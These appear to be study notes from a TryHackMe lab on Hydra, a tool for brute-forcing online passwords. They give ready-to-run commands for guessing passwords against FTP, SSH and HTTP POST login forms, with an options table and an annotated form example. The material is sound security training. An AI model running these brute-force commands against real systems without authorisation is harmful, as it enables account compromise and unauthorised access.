https://tryhackme.com/room/hydra

### Intro

***Brute force online password cracking program***
https://github.com/vanhauser-thc/thc-hydra
https://en.kali.tools/?p=220
`apt install hydra`

___
### Hydra Commands

Depends on which service (protocol) is targeted

Example: brute force **FTP** with username "user" and password list "passlist.txt"
`hydra -l user -P passlist.txt ftp://target_ip_address`

**SSH**
`hydra -l username -P /path/to/password_list.txt target_ip_address -t 4 ssh`
*"`-t 4`" specifies number of threads*

**Post Web Form**
`sudo hydra <username> <wordlist> 10.80.174.80 http-post-form "<path>:<login_credentials>:<invalid_response>"`

| Option                | Description                                                                   |
| --------------------- | ----------------------------------------------------------------------------- |
| `-l`                  | username for (web form) login                                                 |
| `-P`                  | password list to use                                                          |
| `http-post-form`      | type of form is POST                                                          |
| `<path>`              | login page URL (e.g. `login.php`)                                             |
| `<login_credentials>` | username and password used to log in (e.g. `username=^USER^&password=^PASS^`) |
| `<invalid_response>`  | part of the response when the login fails                                     |
| `-V`                  | verbose output for every attempt                                              |
Example: `hydra -l <username> -P <wordlist> 10.80.174.80 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect." -V`
- `/login`: authentication page
- `username=^USER^&password=^PASS^`: format of the input (can be retrieved by trying to authenticate and intercepting the request with Burp)
- `Your username or password is incorrect.`: statement when authentication fails